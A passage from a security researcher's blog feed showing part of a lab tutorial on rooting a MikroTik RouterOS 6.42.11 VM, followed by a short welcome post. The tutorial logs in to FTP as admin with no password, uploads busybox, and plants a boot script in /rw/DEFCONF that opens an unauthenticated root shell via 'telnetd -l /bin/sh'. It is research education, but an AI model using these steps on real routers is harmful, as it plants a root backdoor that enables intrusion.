</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.16.205.150: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.391 ms
</span></span></code></pre></div><p>Test if FTP works as well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ftp admin@172.16.205.150
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Connected to 172.16.205.150.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> MikroTik FTP server <span style="color:#f92672">(</span>MikroTik 6.42.11<span style="color:#f92672">)</span> ready
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Password required <span style="color:#66d9ef">for</span> admin
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User admin logged in
</span></span><span style="display:flex;"><span>Remote system type is UNIX.
</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
</span></span><span style="display:flex;"><span>ftp&gt;
</span></span></code></pre></div><h3 id="22-getting-system-file-npk-from-iso">2.2 Getting system file (.npk) from ISO</h3>
<p>On my ubuntu host, I used 7zip to extract the iso to get its corresponding .npk files</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ 7z x mikrotik-6.42.11.iso
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output</span>
</span></span><span style="display:flex;"><span>7-Zip <span style="color:#f92672">[</span>64<span style="color:#f92672">]</span> 9.20  Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span></span><span style="display:flex;"><span>p7zip Version 9.20 <span style="color:#f92672">(</span>locale<span style="color:#f92672">=</span>en_US.UTF-8,Utf16<span style="color:#f92672">=</span>on,HugeFiles<span style="color:#f92672">=</span>on,4 CPUs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Processing archive: mikrotik-6.42.11.iso
</span></span><span style="display:flex;"><span>Extracting  advanced-tools-6.42.11.npk
</span></span><span style="display:flex;"><span>Extracting  calea-6.42.11.npk
</span></span><span style="display:flex;"><span>Extracting  defpacks
</span></span><span style="display:flex;"><span>Extracting  dhcp-6.42.11.npk
</span></span><span style="display:flex;"><span>Extracting  dude-6.42.11.npk
</span></span><span style="display:flex;"><span>Extracting  gps-6.42.11.npk
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>The only file that we are interested in is the system .npk file.</p>
<h3 id="23-unpacking-system-npk-file">2.3 Unpacking System .npk File</h3>
<p>Using binwalk, we can extract the system file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ binwalk -e system-6.42.11.npk
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output</span>
</span></span><span style="display:flex;"><span>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>             0x0             NPK firmware header, image size: 15616295, image name: <span style="color:#e6db74">&#34;system&#34;</span>, description: <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4096</span>          0x1000          Squashfs filesystem, little endian, version 4.0, compression:xz, size: <span style="color:#ae81ff">9818075</span> bytes, <span style="color:#ae81ff">1340</span> inodes, blocksize: <span style="color:#ae81ff">262144</span> bytes, created: 2018-12-21 09:18:10
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9822304</span>       0x95E060        ELF, 32-bit LSB executable, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9842177</span>       0x962E01        Unix path: /sys/devices/system/cpu
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>If everything runs successfully up to this point, a <strong>_system-$VERSION.npk.extracted</strong> directory will be created.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -la _system-6.42.11.npk.extracted/squashfs-root/	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">72</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> gerald gerald <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">16</span> 21:41 .
</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">3</span> gerald gerald <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">16</span> 21:13 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">16</span> 21:13 bin
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> boot
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> dev
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> gerald gerald    <span style="color:#ae81ff">9</span> Mar <span style="color:#ae81ff">16</span> 21:13 dude -&gt; /dev/null
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> gerald gerald <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">16</span> 21:13 etc
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> flash
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> home
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> initrd
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> gerald gerald <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">16</span> 21:13 lib
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> gerald gerald <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">16</span> 21:13 nova
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> old
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> gerald gerald    <span style="color:#ae81ff">9</span> Mar <span style="color:#ae81ff">16</span> 21:13 pckg -&gt; /dev/null
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> proc
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> ram
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> gerald gerald    <span style="color:#ae81ff">9</span> Mar <span style="color:#ae81ff">16</span> 21:13 rw -&gt; /dev/null
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> sbin
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> gerald gerald <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2018</span> sys
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> gerald gerald    <span style="color:#ae81ff">9</span> Mar <span style="color:#ae81ff">16</span> 21:13 tmp -&gt; /dev/null
</span></span></code></pre></div><h3 id="24-jailbreak-discovery">2.4 Jailbreak Discovery</h3>
<p>Looking through the files, you will stumble upon <strong>squashfs-root/etc/rc.d/run.d/S12defconf</strong>.
A snippet of the bash script is shown in the listing below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>defcf<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /rw/DEFCONF<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>echo &gt; /ram/defconf-params
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /nova/bin/flash <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>	/nova/bin/flash --fetch-defconf-params /ram/defconf-params
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>eval <span style="color:#66d9ef">$(</span>cat /ram/defconf-params<span style="color:#66d9ef">)</span> action<span style="color:#f92672">=</span>apply /bin/gosh $defcf;
</span></span><span style="display:flex;"><span>cp $defcf $confirm; rm /rw/DEFCONF /ram/defconf-params<span style="color:#f92672">)</span> &amp;
</span></span></code></pre></div><p>The above suggests that <strong>/rw/DEFCONF</strong> is a Go Shell script that will be executed on boot.
It is also removed right after finishing execution.
This means that if we can edit/add this script, we will be able to do whatever with want with the system.</p>
<h3 id="25-download-busybox-on-host-machine">2.5 Download busybox on host machine</h3>
<p>BusyBox is a software suite that provides several Unix utilities in a single executable file. The idea is to upload the busybox executable via FTP and edit the <strong>/rw/DEFCONF</strong> to run our busybox.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl https://www.busybox.net/downloads/binaries/1.26.2-defconfig-multiarch/busybox-i686 &gt; busybox-i686
</span></span></code></pre></div><h3 id="26-upload-the-busybox-via-ftp">2.6 Upload the busybox via FTP</h3>
<p>Again, we can login as admin via FTP with no password and we will upload our previously downloaded busybox executable binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; put busybox-i686
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>local: busybox-i686 remote: busybox-i686
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|55029|<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;/busybox-i686&#39;</span>
</span></span><span style="display:flex;"><span>100% |***********************************|   <span style="color:#ae81ff">901</span> KiB   18.72 MiB/s    00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> BINARY transfer complete
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">922936</span> bytes sent in 00:00 <span style="color:#f92672">(</span>17.56 MiB/s
</span></span></code></pre></div><p>After this, power off your virtual machine.</p>
<h3 id="27-boot-from-centos-6-iso">2.7 Boot from CentOS 6 ISO</h3>
<p>The CentOS 6 ISO can be gotten from <a href="https://ftp.riken.jp/Linux/centos-vault/6.8/isos/x86_64/CentOS-6.8-x86_64-LiveCD.iso"><strong>here</strong></a></p>
<p>Switch out the ISO file attached to the CD/ROM hardware component of the VM.</p>
<p>We will then force the first boot to go through the bios by adding the following line in the .vmx file of our VM.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vim Mikrotik-6.42.11.vmx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add the following line any where</span>
</span></span><span style="display:flex;"><span>bios.forceSetupOnce <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUE&#34;</span>
</span></span></code></pre></div><p>Change the boot order by pushing the CD/ROM to the first. Press F10 to save and exit.
<img src="/posts/getting-root-shell-mikrotik-routeros/images/bios-boot-order-cd-first.png" alt="bios-boot-order-cd-first"></p>
<p>Upon exiting, you will see the CentOS 6 installer option. Choose the <em>Boot</em> option.
<img src="/posts/getting-root-shell-mikrotik-routeros/images/boot-centos-livecd.png" alt="boot-centos-livecd"></p>
<p>Once inside CentOS 6, Click on the top left <em>Applications &ndash;&gt; System Tools &ndash;&gt; Terminal</em>.
Run the following commands to mount the routeros sysroot.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>centos@livecd centoslive<span style="color:#f92672">]</span>$ sudo su
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@livecd centoslive<span style="color:#f92672">]</span>$ mkdir /mnt/routeros-sysroot
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@livecd centoslive<span style="color:#f92672">]</span>$ mount /dev/sda2 /mnt/routeros-sysroot
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Create a new DEFCONF file that runs busy box</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@livecd centoslive<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;ok; /rw/disk/busybox-i686 telnetd -l /bin/sh -p 1270;&#34;</span> &gt; /mnt/routeros-sysroot/rw/DEFCONF
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ensure that busybox has executable permission</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@livecd centoslive<span style="color:#f92672">]</span>$ chmod +x /mnt/routeros-sysroot/rw/disk/busybox-i686
</span></span></code></pre></div><h3 id="28-getting-root-shell">2.8 Getting Root Shell</h3>
<p>Once done, shutdown the VM, edit the <em>hardware settings &ndash;&gt; CD/DVD (IDE)</em> and uncheck <em>Connect at power on</em>.
<img src="/posts/getting-root-shell-mikrotik-routeros/images/iso-uncheck-connect-at-power-on.png" alt="iso-uncheck-connect-at-power-on"></p>
<p>Upon powering on the VM, you will see this output instead of the normal login screen.</p>
<p><img src="/posts/getting-root-shell-mikrotik-routeros/images/busybox-running1.png" alt="busybox-running1"></p>
<p>We can now telnet into our RouterOS via port 1270.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ telnet 172.16.205.150 <span style="color:#ae81ff">1270</span>
</span></span></code></pre></div><p><img src="/posts/getting-root-shell-mikrotik-routeros/images/telnet-success.png" alt="telnet-success"></p>
<h3 id="29-running-commands">2.9 Running Commands</h3>
<p>Unlike the typical unix shell, we cannot run the normal linux commands as it is as we would need
to piggyback on busybox in order to run anything.
<img src="/posts/getting-root-shell-mikrotik-routeros/images/busybox-piggyback-ls.png" alt="busybox-piggyback-ls"></p>
<p>Thus to put simply, the template to run any bash commands is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ /rw/disk/busybox-i686 $COMMAND
</span></span></code></pre></div><h2 id="3-conclusion">3. Conclusion</h2>
<p>I hope this guide is comprehensive enough for those who want to get started on
doing vulnerability research on Mikrotik RouterOS systems. If you made it this far,
I hope you learnt a lot and had fun along the way. Cheers and see you in the next post 😃.</p>
]]></content>
        </item>
        
        <item>
            <title>Welcome Stranger</title>
            <link>https://mathscantor.github.io/posts/welcome/</link>
            <pubDate>Fri, 03 Jan 2025 17:43:28 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/welcome/</guid>
            <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Hello there, I do not know how you manage to come here but I welcome you nevertheless. For those of you who may not know me, I am but a simple cyber security researcher. This blog would serve as a way to document down technical details of vulnerabilities / useful workflows I found while progressing through my career.&lt;/p&gt;
&lt;h2 id=&#34;goals&#34;&gt;Goals&lt;/h2&gt;
&lt;p&gt;The aim of this blog is to teach other researchers tricks and tips that they may not have known. In addition, if the opportunity arises, I will also share in-depth analysis on CVEs I find interesting.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Hello there, I do not know how you manage to come here but I welcome you nevertheless. For those of you who may not know me, I am but a simple cyber security researcher. This blog would serve as a way to document down technical details of vulnerabilities / useful workflows I found while progressing through my career.</p>
<h2 id="goals">Goals</h2>
<p>The aim of this blog is to teach other researchers tricks and tips that they may not have known. In addition, if the opportunity arises, I will also share in-depth analysis on CVEs I find interesting.</p>
<h2 id="future">Future</h2>
<p>This blog will most likely be continuously updated as the years go by as it is free. Thanks Hugo!</p>
]]></content>
        </item>
        
    </channel>
</rss>
